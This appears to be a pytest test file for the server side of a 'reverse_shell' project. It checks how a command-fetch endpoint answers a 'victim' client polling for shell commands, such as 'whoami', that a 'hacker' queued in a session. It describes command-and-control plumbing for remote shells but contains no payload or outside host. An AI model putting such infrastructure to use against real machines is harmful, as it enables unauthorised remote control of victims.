from http import HTTPStatus as st
from http.client import HTTPConnection
from sqlite3 import Cursor

import reverse_shell.utils as ut
import tests.mock as mk
import tests.server_test.helper as hp

# Command ID
fetch_cmd_path = hp.get_cmd_id(ut.ServerCommands.fetch_cmd)


def test_fetch_cmd_without_a_session_or_body(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    # Simple, create the client and let's see that the server
    # responds with a NOT_FOUND since the victim ain't really in a session
    victim_id = verified_client_header["client-id"]
    hp.create_victim(victim_id, db_cursor)

    client.request("GET", f"/{fetch_cmd_path}", headers=verified_client_header)

    assert client.getresponse().status == st.BAD_REQUEST


def test_fetch_cmd_with_a_fake_session(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    # Simple, create the client and let's see that the server
    # responds with a NOT_FOUND since the victim is really in a fake session
    victim_id = verified_client_header["client-id"]
    hp.create_victim(victim_id, db_cursor)

    fake_session_id = ut.encode_token(ut.generate_token())

    client.request(
        "GET",
        f"/{fetch_cmd_path}",
        headers=verified_client_header,
        body=fake_session_id,
    )

    assert client.getresponse().status == st.NOT_ACCEPTABLE


def test_fetch_cmd_in_a_session_but_with_an_empty_command(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    # This is also simple, but now we emulate a situation where the hacker hasn't
    # inserted a command, and we just fetch nothing
    victim_id = verified_client_header["client-id"]
    hp.create_victim(victim_id, db_cursor)

    # Create the hacker and establish session
    hacker_id = ut.generate_token()
    hp.create_hacker(hacker_id, db_cursor)

    session_id = mk.sessions.add_session(hacker_id, victim_id)
    session_id = ut.encode_token(session_id)

    # Now make a fetch_cmd command with the session
    client.request(
        "GET", f"/{fetch_cmd_path}", body=session_id, headers=verified_client_header
    )

    assert client.getresponse().status == st.NO_CONTENT


def test_fetch_cmd_in_session_with_command(
    client: HTTPConnection, db_cursor: Cursor, verified_client_header: dict[str, str]
):
    # Now we're going to do multiple things
    # First setup a hacker and victim and put them in a session
    # Then emulate the post_cmd for the hacker
    # request with the fetch_cmd with the session_id
    # verify if the command is correctly received

    victim_id = verified_client_header["client-id"]
    hp.create_victim(victim_id, db_cursor)

    hacker_id = ut.generate_token()
    hp.create_hacker(hacker_id, db_cursor)

    session_id = mk.sessions.add_session(hacker_id, victim_id)

    # Insert a command into the session comm
    cmd = "whoami"
    mk.sessions.insert_command(session_id, cmd)
    session_id = ut.encode_token(session_id)

    client.request(
        "GET", f"/{fetch_cmd_path}", body=session_id, headers=verified_client_header
    )

    response = client.getresponse()

    assert response.status == st.OK

    content_length = response.getheader("content-length")
    if content_length is None:
        assert False

    server_sent_command = response.read(int(content_length)).decode()
    server_sent_command = ut.decode_token(server_sent_command)

    assert server_sent_command == cmd
